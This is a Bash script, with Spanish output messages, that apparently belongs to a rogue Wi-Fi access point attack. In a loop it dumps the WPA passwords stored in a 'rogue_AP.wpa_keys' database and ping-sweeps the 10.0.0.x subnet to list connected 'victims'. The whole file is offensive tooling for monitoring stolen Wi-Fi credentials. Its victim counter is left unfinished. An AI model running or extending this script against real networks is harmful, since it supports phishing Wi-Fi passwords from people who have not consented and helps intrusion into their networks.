#!/bin/bash

endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
greenColour="\e[0;32m\033[1m"

tput civis
clear
echo -e "${redColour}-------------------------------${endColour}"
echo -e "${redColour}[!] Monitoriazondo contraseñas${endColour}"
echo -e "${redColour}-------------------------------${endColour}"
mariadb -u root -e "select * from rogue_AP.wpa_keys"
echo -e "${greenColour}-------------------------------${endColour}"
echo -e "${greenColour}[*] Victimas conectadas: 0${endColour}"
echo -e "${greenColour}-------------------------------${endColour}"

old_process=$(mariadb -u root -e "select * from rogue_AP.wpa_keys")
while true; do
	for i in $(seq 10 254); do
    	timeout 1 bash -c "ping -c 1 10.0.0.$i" > /dev/null 2>&1 && echo -e "\t${redColour}[*]IP 10.0.0.$i ACTIVO${endColour}" &
	done; wait
	sleep 3
	clear
  	echo -e "${redColour}-------------------------------${endColour}"
	echo -e "${redColour}[!] Monitoriazondo contraseñas${endColour}"
	echo -e "${redColour}-------------------------------${endColour}"
	mariadb -u root -e "select * from rogue_AP.wpa_keys"
	echo -e "${greenColour}-------------------------------${endColour}"
	echo -e "${greenColour}[*] Victimas conectadas: ${endColour}"
	echo -e "${greenColour}-------------------------------${endColour}"
	cont=0
done
